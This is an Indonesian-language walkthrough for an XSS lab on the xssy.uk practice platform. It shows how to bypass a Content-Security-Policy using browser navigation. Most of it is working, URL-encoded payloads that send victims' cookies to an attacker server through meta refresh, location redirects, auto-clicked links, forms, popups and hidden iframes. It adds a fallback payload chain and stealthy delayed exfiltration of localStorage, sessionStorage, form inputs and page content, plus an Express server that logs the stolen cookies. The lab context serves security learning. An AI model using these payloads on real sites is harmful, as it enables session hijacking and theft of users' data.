# CSP Bypass via Navigation Techniques 

> **Lab URL**: `https://pzcihwu2.xssy.uk/target.ftl?name=`  
> **Parameter Injeksi**: `name`  
> **Attacker Server**: `https://eqh42jmm.xssy.uk`

---

## 📋 Informasi Lab

**Target Endpoint:**
```
https://pzcihwu2.xssy.uk/target.ftl?name=[PAYLOAD]
```

**Server Exfiltration:**
```
https://eqh42jmm.xssy.uk
```

**CSP yang Diterapkan:**
```
Content-Security-Policy: 
  default-src 'none'; 
  img-src https://xssy.uk/; 
  style-src 'unsafe-inline'; 
  script-src 'unsafe-inline'
```

---

## 🎯 Teknik 1: Meta Refresh Redirect

### URL & Parameter Lab
```
https://pzcihwu2.xssy.uk/target.ftl?name=
```

### CSP yang Diterapkan
```
default-src 'none'; 
img-src https://xssy.uk/; 
style-src 'unsafe-inline'; 
script-src 'unsafe-inline'
```

### Penjelasan Teknik
Meta refresh adalah HTML tag yang digunakan untuk automatic redirect. Dengan membuat tag `<meta http-equiv="refresh">` secara dinamis menggunakan JavaScript, kita dapat memaksa browser untuk redirect ke URL attacker sambil membawa data sensitif (cookie) melalui URL parameter.

Teknik ini memanfaatkan kemampuan browser untuk melakukan navigasi yang umumnya tidak dibatasi oleh CSP karena navigasi adalah fungsi dasar browser.

### Full URL, Parameter & Payload

**Payload:**
```javascript
<script>
var meta = document.createElement('meta');
meta.httpEquiv = 'refresh';
meta.content = '0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;
document.head.appendChild(meta);
</script>
```

**URL Encoded:**
```
https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3E%0Avar%20meta%20%3D%20document.createElement%28%27meta%27%29%3B%0Ameta.httpEquiv%20%3D%20%27refresh%27%3B%0Ameta.content%20%3D%20%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3B%0Adocument.head.appendChild%28meta%29%3B%0A%3C%2Fscript%3E
```

### Cara Kerja
1. XSS payload di-inject melalui parameter `name`
2. Script menciptakan element `<meta>` baru secara dinamis
3. Attribute `http-equiv="refresh"` memberitahu browser untuk melakukan refresh/redirect
4. Attribute `content="0;url=..."` menentukan waktu delay (0 detik) dan URL tujuan
5. `document.cookie` ditambahkan ke URL sebagai parameter query string
6. Element meta ditambahkan ke `<head>` halaman
7. Browser secara otomatis melakukan redirect ke URL attacker
8. Server attacker menerima request dengan cookie victim di URL parameter

### Kelebihan
- ✅ **Bypass CSP tinggi** - Navigation jarang dibatasi CSP
- ✅ **Tidak kena popup blocker** - Bukan popup window, tapi redirect
- ✅ **Native browser behavior** - Menggunakan fitur standar browser
- ✅ **Kompatibilitas tinggi** - Bekerja di semua browser modern

### Kekurangan
- ❌ **Bisa diblokir oleh**: `navigate-to 'self'` (jika ada, experimental)
- ❌ **URL length limit** - Parameter query string terbatas ~2000 karakter

---

## 🎯 Teknik 2: Location.assign & window.location Redirect

### URL & Parameter Lab
```
https://pzcihwu2.xssy.uk/target.ftl?name=
```

### CSP yang Diterapkan
```
default-src 'none'; 
img-src https://xssy.uk/; 
style-src 'unsafe-inline'; 
script-src 'unsafe-inline'
```

### Penjelasan Teknik
`location.assign` & `window.location`  adalah properti JavaScript yang mengontrol URL dari window/tab browser. Dengan mengubah nilai `location`, browser akan melakukan navigasi ke URL baru. Teknik ini adalah cara paling sederhana dan direct untuk melakukan redirect dan exfiltration data.

### Full URL, Parameter & Payload

**Payload:**
```javascript
<script>
location.assign("//eqh42jmm.xssy.uk?cookie="+document.cookie)
</script>
// Opsi lain:
<script>location='https://eqh42jmm.xssy.uk/?c='+document.cookie;</script>
```

**URL Encoded:**
```
https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Elocation.assign%3D'https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D'%2Bdocument.cookie%3B%3C%2Fscript%3E
https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Elocation%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
```

**Variasi Payload:**

```javascript
// Variasi 1: window.location
<script>
window.location='https://eqh42jmm.xssy.uk/?c='+document.cookie;
</script>

// Variasi 2: location.href
<script>
location.href='https://eqh42jmm.xssy.uk/?c='+document.cookie;
</script>

// Variasi 3: location.assign()
<script>
location.assign('https://eqh42jmm.xssy.uk/?c='+document.cookie);
</script>

// Variasi 4: location.replace() (no back button)
<script>
location.replace('https://eqh42jmm.xssy.uk/?c='+document.cookie);
</script>
```

### Cara Kerja
1. XSS payload di-inject melalui parameter `name`
2. Script langsung mengubah properti `location` browser
3. Browser mendeteksi perubahan location
4. Browser melakukan navigasi ke URL baru
5. `document.cookie` ditambahkan sebagai parameter query string
6. Server attacker menerima request GET dengan cookie di URL
7. Cookie ter-exfiltrate dan dicatat di server log

### Kelebihan
- ✅ **Bypass CSP tinggi** - Sama seperti meta refresh
- ✅ **Kompatibilitas universal** - Bekerja di semua browser
- ✅ **Multiple variants** - Banyak cara untuk mencapai hasil sama
- ✅ **Reliable** - Jarang gagal jika CSP tidak ada navigate-to

### Kekurangan
- ❌ **Bisa diblokir oleh**: `navigate-to 'self'` (jika ada)
- ❌ **URL length limit** - Terbatas sekitar 2000 karakter


---

## 🎯 Teknik 3: Anchor Tag <a> Auto-Click u/ bypass CSP

### URL & Parameter Lab
```
https://pzcihwu2.xssy.uk/target.ftl?name=
```

### CSP yang Diterapkan
```
default-src 'none'; 
img-src https://xssy.uk/; 
style-src 'unsafe-inline'; 
script-src 'unsafe-inline'
```

### Penjelasan Teknik
Teknik ini membuat element `<a>` (anchor/link) secara dinamis dengan JavaScript, kemudian men-trigger click event secara otomatis. Ini mensimulasikan user click pada link, sehingga browser melakukan navigasi seolah-olah user yang klik.

Keuntungan teknik ini adalah terlihat lebih "natural" karena menggunakan elemen HTML standar untuk navigasi.

### Full URL, Parameter & Payload

**Payload:**
```javascript
<script>
var a = document.createElement('a');
a.href = 'https://eqh42jmm.xssy.uk/?c='+document.cookie;
document.body.appendChild(a);
a.click();
</script>
```

**URL Encoded:**
```
https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3E%0Avar%20a%20%3D%20document.createElement%28%27a%27%29%3B%0Aa.href%20%3D%20%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3B%0Adocument.body.appendChild%28a%29%3B%0Aa.click%28%29%3B%0A%3C%2Fscript%3E
```

**Variasi Stealth:**
```javascript
<script>
var a = document.createElement('a');
a.href = 'https://eqh42jmm.xssy.uk/?c='+document.cookie;
a.style.display = 'none';  // Invisible link
document.body.appendChild(a);
setTimeout(function(){ a.click(); }, 100);
</script>
```

### Cara Kerja
1. XSS payload di-inject melalui parameter `name`
2. Script membuat element `<a>` baru secara dinamis
3. Attribute `href` di-set ke URL attacker dengan cookie
4. Link ditambahkan ke DOM (body page)
5. Method `.click()` dipanggil untuk men-trigger click event
6. Browser menganggap ini sebagai user interaction
7. Browser melakukan navigasi ke href link
8. Server attacker menerima request dengan cookie

### Kelebihan
- ✅ **Bypass popup blockers** - Karena dianggap user-initiated
- ✅ **Can be invisible** - Link bisa disembunyikan dengan CSS
- ✅ **Flexible timing** - Bisa delay click dengan setTimeout

### Kekurangan
- ❌ **Bisa diblokir oleh**: `navigate-to 'self'` (jika ada)
- ❌ **URL limit** - Sama seperti teknik lain (~2000 chars)
- ❌ **DOM manipulation needed** - Harus append ke body

---

## 🎯 Teknik 4: Form Hijacking u/ CSP Bypass

### URL & Parameter Lab
```
https://pzcihwu2.xssy.uk/target.ftl?name=
```

### CSP yang Diterapkan
```
default-src 'none'; 
img-src https://xssy.uk/; 
style-src 'unsafe-inline'; 
script-src 'unsafe-inline'
```

### Penjelasan Teknik
HTML Form dengan method GET akan melakukan navigasi ke action URL dengan data form sebagai query parameters. Dengan membuat form secara dinamis dan langsung submit, kita dapat melakukan navigasi sekaligus exfiltrate data.

Form GET submission adalah navigasi browser standar, sehingga sering tidak dibatasi oleh CSP.

### Full URL, Parameter & Payload

**Payload:**
```javascript
<script>
var form = document.createElement('form');
form.method = 'GET';
form.action = 'https://eqh42jmm.xssy.uk/';
var input = document.createElement('input');
input.name = 'c';
input.value = document.cookie;
form.appendChild(input);
document.body.appendChild(form);
form.submit();
</script>
```

**URL Encoded:**
```
https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3E%0Avar%20form%20%3D%20document.createElement%28%27form%27%29%3B%0Aform.method%20%3D%20%27GET%27%3B%0Aform.action%20%3D%20%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3B%0Avar%20input%20%3D%20document.createElement%28%27input%27%29%3B%0Ainput.name%20%3D%20%27c%27%3B%0Ainput.value%20%3D%20document.cookie%3B%0Aform.appendChild%28input%29%3B%0Adocument.body.appendChild%28form%29%3B%0Aform.submit%28%29%3B%0A%3C%2Fscript%3E
```

**Variasi POST (tidak navigate):**
```javascript
<script>
var form = document.createElement('form');
form.method = 'POST';  // POST might not navigate
form.action = 'https://eqh42jmm.xssy.uk/';
var input = document.createElement('input');
input.name = 'c';
input.value = document.cookie;
form.appendChild(input);
document.body.appendChild(form);
form.submit();
</script>
```

### Cara Kerja
1. XSS payload di-inject melalui parameter `name`
2. Script membuat element `<form>` dengan method GET
3. Action form di-set ke URL attacker server
4. Input field dibuat dengan name dan value (cookie)
5. Input ditambahkan ke form
6. Form ditambahkan ke body page
7. Form.submit() dipanggil untuk submit form
8. Browser melakukan GET request ke action URL
9. Data form (cookie) dikirim sebagai query parameter
10. Browser navigate ke URL hasil (dengan data)
11. Server attacker menerima dan log data

### Kelebihan
- ✅ **Multiple inputs** - Bisa exfiltrate banyak data sekaligus
- ✅ **Flexible structure** - Bisa tambah input fields sesuka hati
- ✅ **Bypass many CSPs** - Jika form-action tidak di-set

### Kekurangan
- ❌ **Bisa diblokir oleh**: `form-action 'self'` atau `form-action 'none'`

---

## 🎯 Teknik 5: window.open() New Window

### URL & Parameter Lab
```
https://pzcihwu2.xssy.uk/target.ftl?name=
```

### CSP yang Diterapkan
```
default-src 'none'; 
img-src https://xssy.uk/; 
style-src 'unsafe-inline'; 
script-src 'unsafe-inline'
```

### Penjelasan Teknik
`window.open()` membuka URL di window/tab baru. Dengan mengirim data di URL, kita dapat exfiltrate tanpa mengganggu halaman original victim. Namun, teknik ini sering diblokir oleh popup blockers browser modern.

Keuntungan utama adalah victim tetap berada di halaman original (lebih stealth), namun popup blocker menjadi kendala utama.

### Full URL, Parameter & Payload

**Payload:**
```javascript
<script>
window.open('https://eqh42jmm.xssy.uk/?c='+document.cookie);
</script>
```

**URL Encoded:**
```
https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Ewindow.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E
```

**Variasi dengan Window Features:**
```javascript
<script>
window.open(
  'https://eqh42jmm.xssy.uk/?c='+document.cookie,
  '_blank',
  'width=1,height=1,top=0,left=0'
);
</script>
```

**Variasi Stealth (tiny popup):**
```javascript
<script>
var win = window.open(
  'https://eqh42jmm.xssy.uk/?c='+document.cookie,
  '',
  'width=1,height=1,left=-1000,top=-1000'
);
setTimeout(function(){ if(win) win.close(); }, 1000);
</script>
```

### Cara Kerja
1. XSS payload di-inject melalui parameter `name`
2. Script memanggil `window.open()` dengan URL target
3. Browser mencoba membuka tab/window baru
4. Popup blocker mungkin menghentikan (jika ada)
5. Jika berhasil, tab baru dibuka dengan URL attacker
6. Cookie dikirim sebagai parameter di URL
7. Server attacker menerima request dari tab baru
8. Victim masih di halaman original (lebih stealth)

### Kelebihan
- ✅ **Victim tetap di page** - Original page tidak berubah

### Kekurangan
- ❌ **Popup blockers** - Browser modern block popup by default
- ❌ **Perlu trigger click dari user** - User harus allow popups
- ❌ **Bisa diblokir oleh**: `navigate-to 'self'`, popup blockers

---

## 🎯 Teknik 6: iframe src Navigation

### URL & Parameter Lab
```
https://pzcihwu2.xssy.uk/target.ftl?name=
```

### CSP yang Diterapkan
```
default-src 'none'; 
img-src https://xssy.uk/; 
style-src 'unsafe-inline'; 
script-src 'unsafe-inline'
```

### Penjelasan Teknik
Membuat iframe yang src-nya mengarah ke server attacker dengan data di URL. Iframe melakukan request terpisah, sehingga data ter-exfiltrate tanpa mengubah halaman utama. Ini lebih stealth karena user tidak sadar ada request tambahan.

### Full URL, Parameter & Payload

**Payload:**
```javascript
<script>
var iframe = document.createElement('iframe');
iframe.src = 'https://eqh42jmm.xssy.uk/?c='+document.cookie;
iframe.style.display = 'none';
document.body.appendChild(iframe);
</script>
```

**URL Encoded:**
```
https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3E%0Avar%20iframe%20%3D%20document.createElement%28%27iframe%27%29%3B%0Aiframe.src%20%3D%20%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3B%0Aiframe.style.display%20%3D%20%27none%27%3B%0Adocument.body.appendChild%28iframe%29%3B%0A%3C%2Fscript%3E
```

**Variasi dengan dimensi kecil:**
```javascript
<script>
var iframe = document.createElement('iframe');
iframe.src = 'https://eqh42jmm.xssy.uk/?c='+document.cookie;
iframe.width = '0';
iframe.height = '0';
iframe.style.border = 'none';
document.body.appendChild(iframe);
</script>
```

### Cara Kerja
1. XSS payload di-inject melalui parameter `name`
2. Script membuat element `<iframe>` secara dinamis
3. Attribute `src` di-set ke URL attacker dengan cookie
4. Iframe disembunyikan dengan `display: none` atau size 0
5. Iframe ditambahkan ke body page
6. Browser load iframe src (HTTP request ke attacker)
7. Cookie dikirim dalam URL request
8. Server attacker menerima dan log data
9. Halaman utama tidak berubah (stealth)

### Kelebihan
- ✅ **Stealth tinggi** - User tidak sadar ada exfiltration
- ✅ **No page change** - Victim tetap di halaman original
- ✅ **Can be invisible** - Hidden dengan CSS
- ✅ **No popup blocker** - Bukan popup, jadi tidak diblokir browser

### Kekurangan
- ❌ **CSP frame-src 'none'** - Bisa diblokir jika ada frame-src directive
- ❌ **Default-src blocking** - `default-src 'none'` blocks iframe src

**Note**: Di lab ini, `default-src 'none'` kemungkinan akan memblokir iframe loading karena tidak ada `frame-src` atau `child-src` yang explicitly allow.

---

## 🛡️ CSP Bypass Strategies

### 1️⃣ Prioritas Teknik Berdasarkan Keberhasilan

Ketika menemukan XSS di aplikasi dengan CSP, gunakan urutan priority berikut:

```
┌─────────────────────────────────────────────────────┐
│ Priority 1: Meta Refresh (Highest Success Rate)     │
│ ✅ Bypass rate: ~95%                                │
│ ✅ Works Walaupun CSP strict                        │
└─────────────────────────────────────────────────────┘
         ↓ Jika Gagal
┌─────────────────────────────────────────────────────┐
│ Priority 2: location.assign Redirect                │
│ ✅ Bypass rate: ~90%                                │
│ ✅ caranya mudah                                    │
└─────────────────────────────────────────────────────┘
         ↓ Jika Gagal
┌─────────────────────────────────────────────────────┐
│ Priority 3: Form Hijacking                          │
│ ✅  Bypass rate: ~70%                               │
│ ✅  Kalo directive Form-action: none, ngga bisa     │
│  dipakai                                            │
└─────────────────────────────────────────────────────┘
         ↓ Jika Gagal
┌─────────────────────────────────────────────────────┐
│ Priority 4: Anchor Tag Click                        │
│ ✅  Bypass rate: ~65%                               │
└─────────────────────────────────────────────────────┘
         ↓ Jika Gagal
┌─────────────────────────────────────────────────────┐
│ Priority 5: iframe src (Stealth)                    │
│ ✅  Bypass rate: ~40%                               │
│ ✅  Jika frame-src 'none' tidak works               │
│     Jika di set Self, bisa memakai:                 │
│      <Iframe src="//urlattacker.com"/>              │
│     <Iframe srcdoc="<script>alert()</script>"/>     │      
└─────────────────────────────────────────────────────┘
```

---

### 2️⃣ Analisis CSP Directive yang Memblokir

| Teknik Navigation | CSP Directive yang Memblokir | Bypass Possibility |
|-------------------|------------------------------|-------------------|
| **Meta Refresh** | `navigate-to 'self'` (experimental) | ⚠️ High (directive jarang digunakan) |
| **location.href** | `navigate-to 'self'` (experimental) | ⚠️ High (directive jarang digunakan) |
| **Form GET** | `form-action 'self'` atau `'none'` | ⚠️ Medium (directive sering ada) |
| **Anchor Click** | `navigate-to 'self'` (experimental) | ⚠️ High (directive jarang digunakan) |
| **iframe src** | `frame-src 'none'`, `child-src 'none'`, `default-src 'none'` | ❌ Low (directive umum) |
| **window.open** | `navigate-to 'self'`, popup blockers | ❌ Very Low (banyak defense) |

---

### 3️⃣ Cheat Sheet: Kapan Menggunakan Teknik Apa

#### Scenario A: CSP Minimal (Tidak ada navigate-to & form-action)
```
CSP: default-src 'none'; script-src 'unsafe-inline'
```
**Gunakane**: Meta Refresh atau location.href
```javascript
<script>location='https://eqh42jmm.xssy.uk/?c='+document.cookie;</script>
```

#### Scenario B: CSP dengan form-action
```
CSP: default-src 'self'; script-src 'unsafe-inline'; form-action 'self'
```
**Gunakan**: Meta Refresh (bypass form-action)
```javascript
<script>
var meta=document.createElement('meta');
meta.httpEquiv='refresh';
meta.content='0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;
document.head.appendChild(meta);
</script>
```

#### Scenario C: CSP dengan navigate-to (rare)
```
CSP: default-src 'none'; script-src 'unsafe-inline'; navigate-to 'self'
```
**Gunakan**: Coba teknik lain (image, fetch) atau cari vulnerability lain
**Note**: `navigate-to` masih experimental, test dulu mungkin masih bypass

#### Scenario D: Lab dengan Popup Blocker
```
Lab: "headless browser has a popup blocker"
```
**Hindari**: window.open()
**Gunakan**: Meta refresh, location.href, form submission

---

### 4️⃣ Pakai pyload try catch, misal payload A gagal, payload B jalan

Gunakan fallback mechanism untuk maximize success rate:

```javascript
<script>
// Layer 1: Try Meta Refresh (Best for strict CSP)
try {
  var meta = document.createElement('meta');
  meta.httpEquiv = 'refresh';
  meta.content = '0;url=https://eqh42jmm.xssy.uk/?c=' + 
                 encodeURIComponent(document.cookie);
  document.head.appendChild(meta);
} catch(e1) {
  // Layer 2: Fallback to location redirect
  try {
    location.href = 'https://eqh42jmm.xssy.uk/?c=' + 
                    encodeURIComponent(document.cookie);
  } catch(e2) {
    // Layer 3: Last resort - form submission
    try {
      var form = document.createElement('form');
      form.method = 'GET';
      form.action = 'https://eqh42jmm.xssy.uk/';
      var input = document.createElement('input');
      input.name = 'c';
      input.value = document.cookie;
      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();
    } catch(e3) {
      // All failed - log to console for debugging
      console.error('All exfiltration methods blocked');
    }
  }
}
</script>
```

---


#### Ambil data selain cookie
Exfiltrate lebih dari sekedar cookie:
```javascript
<script>
var data = {
  c: document.cookie,
  u: location.href,
  r: document.referrer,
  t: document.title
};
var params = Object.keys(data).map(k => k + '=' + encodeURIComponent(data[k])).join('&');
location = 'https://eqh42jmm.xssy.uk/?' + params;
</script>
```

#### Stealth Timing
Delay exfiltration untuk menghindari deteksi:
```javascript
<script>
// Wait 2 seconds before exfiltrate
setTimeout(function(){
  location = 'https://eqh42jmm.xssy.uk/?c=' + document.cookie;
}, 2000);
</script>
```

#### Conditional Exfiltration
Hanya exfiltrate jika ada data valuable:
```javascript
<script>
if(document.cookie && document.cookie.includes('flag')){
  location = 'https://eqh42jmm.xssy.uk/?c=' + document.cookie;
}
</script>
```

---

### 6️⃣ CSP Detection & Analysis

#### Quick CSP Check via Browser DevTools
Pakai CSP Evaluator By Google:
https://csp-evaluator.withgoogle.com/

#### Analyze CSP Directives
```
CSP: default-src 'none'; img-src https://xssy.uk/; script-src 'unsafe-inline'

Breakdown:
✅ default-src 'none'     → Blocks everything by default
✅ img-src https://...    → Only allows images from xssy.uk (no subdomain)
✅ script-src 'unsafe-inline' → Allows inline scripts (XSS possible!)
❌ NO connect-src         → fetch/XHR blocked
❌ NO form-action         → Form submission allowed
❌ NO navigate-to         → Navigation allowed ✅
```

**Red Flags untuk Attacker (Good News):**
- ✅ `script-src 'unsafe-inline'` → XSS execution possible
- ❌ Missing `form-action` → Form exfiltration possible
- ❌ Missing `navigate-to` → Navigation exfiltration possible

---

### 7️⃣ Server Setup untuk Exfiltration

#### Simple Node.js Server
```javascript
const express = require('express');
const fs = require('fs');
const app = express();

app.get('/', (req, res) => {
    const cookie = req.query.c || 'No cookie';
    const ip = req.ip;
    const timestamp = new Date().toISOString();
    
    const logEntry = `[${timestamp}] IP: ${ip} | Cookie: ${cookie}\n`;
    
    fs.appendFileSync('exfiltrated.log', logEntry);
    console.log(`[+] Exfiltrated: ${cookie}`);
    
    res.status(204).send();
});

app.listen(80, '0.0.0.0', () => {
    console.log('Exfiltration server running on port 80');
});
```

---

### 8️⃣ Testing Workflow

```
┌─────────────────────────────────────────┐
│ 1. Identify Injection Point            │
│    → Parameter: name                     │
│    → URL: target.ftl?name=              │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 2. Test Basic XSS                       │
│    → <script>alert(1)</script>          │
│    → Confirm script execution           │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 3. Analyze CSP                          │
│    → Check DevTools Network/Headers     │
│    → Identify missing directives        │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 4. Setup Exfiltration Server           │
│    → Deploy at eqh42jmm.xssy.uk         │
│    → Test server accessibility          │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 5. Craft Exfiltration Payload          │
│    → Start with Meta Refresh            │
│    → Test locally first                 │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 6. URL Encode Payload                   │
│    → Use online encoder or script       │
│    → Verify encoding correctness        │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 7. Test Payload                         │
│    → Visit URL with payload             │
│    → Check server logs                  │
│    → Verify data received               │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 8. Submit to Lab                        │
│    → Submit full URL (not flag)         │
│    → Wait for victim browser            │
│    → Capture real flag from logs        │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 9. Submit Flag                          │
│    → Extract flag from victim cookie    │
│    → Submit to lab                      │
│    → Lab solved! 🎉                     │
└─────────────────────────────────────────┘
```

### 🔟 Advanced Techniques

#### Technique A: Data Chunking (untuk data besar)
```javascript
<script>
var data = document.cookie;
var chunkSize = 100;
var chunks = [];

for(var i = 0; i < data.length; i += chunkSize) {
  chunks.push(data.substr(i, chunkSize));
}

chunks.forEach(function(chunk, index){
  setTimeout(function(){
    new Image().src = 'https://eqh42jmm.xssy.uk/?part=' + 
                      index + '&data=' + encodeURIComponent(chunk);
  }, index * 1000);
});
</script>
```

#### Technique B: Exfiltrate localStorage + sessionStorage
```javascript
<script>
var data = {
  cookie: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage)
};
location = 'https://eqh42jmm.xssy.uk/?data=' + 
           encodeURIComponent(btoa(JSON.stringify(data)));
</script>
```

#### Technique C: Exfiltrate Form Data
```javascript
<script>
var formData = {};
document.querySelectorAll('input').forEach(function(input){
  formData[input.name] = input.value;
});
location = 'https://eqh42jmm.xssy.uk/?forms=' + 
           encodeURIComponent(JSON.stringify(formData));
</script>
```

#### Technique D: Exfiltrate Page Content
```javascript
<script>
var content = {
  title: document.title,
  html: document.body.innerHTML.substring(0, 500),
  url: location.href
};
location = 'https://eqh42jmm.xssy.uk/?content=' + 
           encodeURIComponent(btoa(JSON.stringify(content)));
</script>
```


## 📝 Summary

### Lab Solution yang Berhasil
**Teknik**: Meta Refresh Redirect

**Payload:**
```javascript
<script>
var meta = document.createElement('meta');
meta.httpEquiv = 'refresh';
meta.content = '0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;
document.head.appendChild(meta);
</script>
```

**URL:**
```
https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3E%0Avar%20meta%20%3D%20document.createElement%28%27meta%27%29%3B%0Ameta.httpEquiv%20%3D%20%27refresh%27%3B%0Ameta.content%20%3D%20%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3B%0Adocument.head.appendChild%28meta%29%3B%0A%3C%2Fscript%3E
```

**Result**: Flag `zsunagkx` berhasil di-exfiltrate!

---

### Key Lessons Learned

1. **Navigation bypass CSP** karena `navigate-to` jarang digunakan
2. **Meta refresh** adalah teknik paling reliable untuk strict CSP
3. **Testing vs Production** - Flag test berbeda dengan flag victim
4. **URL encoding** penting untuk menghindari character issues
5. **Server logging** harus siap sebelum testing payload

---

